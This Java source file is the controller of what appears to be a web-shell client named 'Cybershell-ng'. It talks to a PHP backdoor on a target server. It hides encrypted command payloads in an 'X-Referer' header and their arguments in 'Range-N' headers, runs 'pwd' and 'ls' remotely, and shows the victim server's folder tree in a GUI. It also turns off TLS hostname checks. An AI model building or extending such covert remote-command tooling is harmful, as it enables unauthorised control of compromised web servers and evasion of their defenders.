/**
 * 
 */
package controllers;

import java.io.IOException;
import java.net.MalformedURLException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.http.HttpResponse;
import org.apache.http.ParseException;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.conn.ssl.NoopHostnameVerifier;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;
import org.json.JSONException;

import fxml.ShellView;
import javafx.application.Platform;
import javafx.scene.control.Alert.AlertType;
import javafx.scene.control.TabPane;
import javafx.scene.control.TreeItem;
import javafx.scene.control.TreeView;
import javafx.scene.input.MouseEvent;
import javafx.scene.layout.HBox;
import models.BinaryModel;
import models.TargetModel;
import utilities.CryptoUtils;
import utilities.PopupUtils;

/**
 * @author Kevinlpd
 *
 */
public class ShellController extends Thread {
	private TargetModel target;
	private ShellView view;
	private BinaryModel binary;
	private String path_of_shell;
	
	public ShellController(String id, TabPane Shellmanager){		
		this.target = new TargetModel().getTargetById(id);
		this.view = new ShellView(target, Shellmanager);
		this.binary = new BinaryModel();
	}
	
	@Override
	public void run() {				
		this.isLive();	
		
		// Set current path field
		String pwd = this.binary.get_binary("pwd", "php", "linux");
		this.path_of_shell = sendPost(pwd, new String[]{});
		this.view.current_path.setText(this.path_of_shell);
		
		// Render explorer
		String ls = this.binary.get_binary("ls", "php", "linux");
		String result = sendPost(ls, new String[] {this.path_of_shell});
		System.out.println(this.convert_to_map(result));
		
		// Render folder tree
		result = sendPost(ls, new String[] {"/"});
		List<Map<String, String>> rows = this.convert_to_map(result);
		render_folder_tree(this.view.getRoot(), "/", rows);
		
		// HANDLING EVENTS
		/*
		 * Event double click to node in folder tree
		 * Execute command 'ls' and render
		 */
		this.view.tree_view.addEventHandler(MouseEvent.MOUSE_CLICKED, (e)->{
			if (e.getClickCount() == 2){
				TreeItem<String> item_selected = ((TreeView<String>)e.getSource()).getSelectionModel().getSelectedItem();
				String rs = sendPost(
									this.binary.get_binary("ls", "php", "linux")
									, new String[] {get_path(item_selected)});
				render_folder_tree(item_selected, get_path(item_selected), this.convert_to_map(rs));
			}
		});
	}
	
	/*
	 * Convert from string is result of command 'ls -lah' to map instance
	 */
	private List<Map<String, String>> convert_to_map(String all_files) {
		List<Map<String, String>> rows = new ArrayList<Map<String,String>>();
		Map<String, String> el_map;
		String[] element;
		for (String row : all_files.split("\n")) {
			el_map = new HashMap<String, String>();
			element = row.split("\\s+", 9);
			if (element.length != 9) { continue; }
			
			el_map.put("permission", element[0]);
			el_map.put("owner", element[2]);
			el_map.put("group", element[3]);
			el_map.put("size", element[4]);
			el_map.put("time", element[7] + "/" + element[6] + "/" + element[5]);
			el_map.put("name", element[8]);
			
			if (element[0].substring(0,1).equals("d")) {
				el_map.put("type", "dir");
			}else if(element[0].substring(0,1).equals("-")) {
				el_map.put("type", "file");
			}else {
				el_map.put("type", "other");
			}
			
			rows.add(el_map);
		}
		return rows;
	}
	/*
	 * Happeneds to be the current thread, This will temination it
	 */
	private void exit() {
		Thread.currentThread().interrupt();
		Platform.runLater(()->{
			this.view.tab_session.getTabPane().getTabs().remove(this.view.tab_session);
		});
	}
	/*
	 * Check shell is live
	 * If false, alert notification and exit this tab
	 */
	private void isLive() {
		if (this.sendGet().getStatusLine().getStatusCode() != 200) {
			new PopupUtils(AlertType.ERROR, sendGet().getStatusLine() + "");
			this.exit();
		}else {				
			this.view.change_state_to_load_success();
		}
	}
	
	// ======================== FOLDER TREE ================================= //
	
	/*
	 * Get path of node was clicked in folder tree
	 */
	private String get_path(TreeItem<String> node){
		if (node.getValue().equals("/")){
			return "/";
		}
		return get_path(node.getParent()) + node.getValue();
	}
	/*
	 * Render folder tree to GUI
	 */
	private void render_folder_tree(TreeItem<String> parent_node, String current_path, List<Map<String, String>> rows){	
		// Render to explorer left sestion
		List<TreeItem<String>> folders = new ArrayList<TreeItem<String>>();
		for (Map<String, String> row : rows) {
			TreeItem<String> item = null;
			if (!(	row.get("name").equals(".") 		// Pass current dir
					|| row.get("name").equals("..")		// Pass parent dir
				) && row.get("type").equals("dir")		// directory only		
			) {
				item = new TreeItem<String>(row.get("name"));
				folders.add(item);
			}
		}
		this.view.add_item_to_tree_view(parent_node, folders);
	}
		
	// ========================= EXPLORER =========================== // 
		
	
	
	// ======================= HTTP REQUESTS ============================ //
	
	/*
	 * Send HTTP POST request
	 */
	private String sendPost(String payload, String[] args) {
		this.view.change_state_to_loading();
		// Encrypt payload
		CryptoUtils crypto = new CryptoUtils();
		payload = crypto.encrypt(this.binary.get_binary("base", "php", "linux") + payload);
		for (int i=0; i<args.length; i++) {
			args[i] = crypto.encrypt(args[i]);
		}				
		// HTTP header and embed payload exploit
		HttpPost post = new HttpPost(this.target.getUrl());
		post.setHeader("User-Agent", "Cybershell-ng version 2.0");
		post.setHeader("X-Referer", payload);
		for (int i=0; i<args.length; i++) {
			post.setHeader("Range-"+i, args[i]);
		}		
		try {
			// Set proxy and initial instance client request
			//HttpHost proxy = new HttpHost("localhost", 8080);
			CloseableHttpClient httpclient = HttpClients.custom()
												//.setRoutePlanner(new DefaultProxyRoutePlanner(proxy))	// set through proxy
																	// set through ssl
												.setSSLHostnameVerifier(NoopHostnameVerifier.INSTANCE)
												.build();
						
			// Exec request and get response
			HttpResponse resp = httpclient.execute(post);
			this.view.change_state_to_load_success();
	        return crypto.decrypt(EntityUtils.toString(resp.getEntity())).getString("output");
		} catch (IOException e) {
			e.printStackTrace();
		} catch (ParseException e) {
			e.printStackTrace();
		} catch (JSONException e) {
			e.printStackTrace();
		}
		return null;
	}
	/*
	 * Send HTTP request using method GET
	 */
	private HttpResponse sendGet() {
		try {
			HttpGet GET = new HttpGet(this.target.getUrl());
			GET.setHeader("User-Agent", "Cybershell-ng version 2.0");
		//	HttpHost proxy = new HttpHost("localhost", 8080);
			CloseableHttpClient httpclient = HttpClients.custom()
												//.setRoutePlanner(new DefaultProxyRoutePlanner(proxy))	// set through proxy
																	// set through ssl
												.setSSLHostnameVerifier(NoopHostnameVerifier.INSTANCE)
												.build();
						
			// Exec request and get response
			HttpResponse resp = httpclient.execute(GET);
			return resp;
		} catch (MalformedURLException e) {
			new PopupUtils(AlertType.ERROR, "Url is wrong");
			this.exit();
			return null;
		} catch (IOException e) {
			new PopupUtils(AlertType.ERROR, "Request time out");
			this.exit();
			return null;
		}		
	}
	
}
